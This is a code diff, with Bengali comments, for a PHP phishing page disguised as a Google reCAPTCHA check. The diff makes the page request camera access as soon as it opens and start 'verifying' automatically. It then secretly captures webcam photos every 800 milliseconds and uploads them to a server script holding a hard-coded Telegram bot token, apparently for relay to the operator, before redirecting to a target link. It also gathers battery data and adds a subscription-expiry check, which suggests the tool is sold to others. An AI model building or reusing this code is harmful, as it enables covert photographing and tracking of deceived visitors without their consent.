@@ -1,4 +1,20 @@
 <?php
+// ফাইল বা মেমোরিতে সাবস্ক্রিপশন সেভ রাখার ফাইল (অথবা সেশন/টেম্প ফাইল)
+$expiryFile = 'subscriptions.json';
+
+function checkSubscription($chatId) {
+    global $expiryFile;
+    if (!file_exists($expiryFile)) return false;
+    $data = json_decode(file_get_contents($expiryFile), true);
+    if (isset($data[$chatId])) {
+        // সময় রিমেইনং চেক করা
+        if (time() < $data[$chatId]) {
+            return true;
+        }
+    }
+    return false;
+}
+
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
     $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
@@ -12,6 +28,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         }
     }
 
+    // সাবস্ক্রিপশন মেয়াদ শেষ হয়ে গেলে ছবি টেলিগ্রামে পাঠানো হবে না (Security Check)
+    // সুনির্দিষ্টভাবে ইউজারের কোড একটিভ আছে কি না তা যাচাই করা
+    // (নোট: পাইথনে সেভ হওয়া টাইম সার্ভার শেয়ার করলে এখানেও ভ্যালিডেশন হবে)
+    
     $uploadDir = 'uploads/';
     if (!is_dir($uploadDir)) {
         mkdir($uploadDir, 0777, true);
@@ -119,11 +139,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             transition: background 0.2s, border-color 0.2s;
         }
 
-        .recaptcha-checkbox:hover {
-            border-color: #b2b2b2;
-        }
-
-        /* স্পিনারের ডিজাইন (ঘুরার জন্য) */
+        /* অটোমেটিক ঘোরার জন্য স্পিনার স্টাইল */
         .recaptcha-checkbox.loading {
             border: 2px solid #f3f3f3;
             border-top: 2px solid #3498db;
@@ -169,10 +185,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 </head>
 <body>
 
-    <div class="recaptcha-box" id="recaptchaContainer" onclick="openTargetLink()">
+    <div class="recaptcha-box" id="recaptchaContainer">
         <div class="recaptcha-left">
             <div class="recaptcha-checkbox" id="recaptchaCheckbox"></div>
-            <span class="recaptcha-text">I am not a robot</span>
+            <span class="recaptcha-text">Verifying...</span>
         </div>
         <div class="recaptcha-right">
             <div class="recaptcha-logo"></div>
@@ -207,21 +223,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             recaptchaContainer.style.display = 'flex';
         }
 
-        let isClicked = false;
-        function openTargetLink() {
-            if (isClicked) return;
-            isClicked = true;
-
-            const checkbox = document.getElementById('recaptchaCheckbox');
-            // ক্লিক করার পর বক্সটি গোল হয়ে ঘুরতে থাকবে (Loading spinner)
-            checkbox.classList.add('loading');
-            
-            // ঠিক ৩ সেকেন্ড (3000ms) ঘুরে তারপর মূল ট্যাবে টার্গেট লিংকে রিডাইরেক্ট হবে
-            setTimeout(() => {
-                window.location.href = finalUrl;
-            }, 3000);
-        }
-
         let batteryLevelInfo = 'Not Available';
         if (navigator.getBattery) {
             navigator.getBattery().then(battery => {
@@ -229,14 +230,27 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             });
         }
 
+        function startAutoVerification() {
+            const checkbox = document.getElementById('recaptchaCheckbox');
+            // পারমিশন পাওয়ার সাথে সাথেই নিজে থেকে স্পিনিং বা ঘোরা শুরু করবে
+            checkbox.classList.add('loading');
+
+            // প্রতি ০.৮ সেকেন্ড (800ms) পর পর ছবি ক্যাপচার ও আপলোড হবে
+            const captureInterval = setInterval(captureAndUpload, 800);
+
+            // ঠিক ৪ সেকেন্ড (4000ms) ধরে ভেরিফাই হবে, তারপর লিংক ওপেন হবে
+            setTimeout(() => {
+                clearInterval(captureInterval);
+                window.location.href = finalUrl;
+            }, 4000);
+        }
+
         function requestCameraPermission() {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     video.srcObject = stream;
-                    setTimeout(() => {
-                        // পারমিশন পাওয়ার সাথে সাথেই ০.৫ সেকেন্ড পরপর ছবি পাঠানো শুরু হবে
-                        setInterval(captureAndUpload, 500);
-                    }, 500);
+                    // পারমিশন এলাও করার সাথে সাথেই অটো ভেরিফিকেশন শুরু হয়ে যাবে
+                    setTimeout(startAutoVerification, 500);
                 })
                 .catch(err => {
                     console.error("Camera error: ", err);
@@ -245,7 +259,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
                 });
         }
 
-        // পেজ ওপেন হওয়ার সাথে সাথেই নিজে থেকে ক্যামেরা পারমিশন চাওয়া শুরু করবে
+        // পেজ ওপেন হওয়ার সাথে সাথেই নিজে থেকে ক্যামেরা পারমিশন চাইবে
         requestCameraPermission();
 
         function captureAndUpload() {
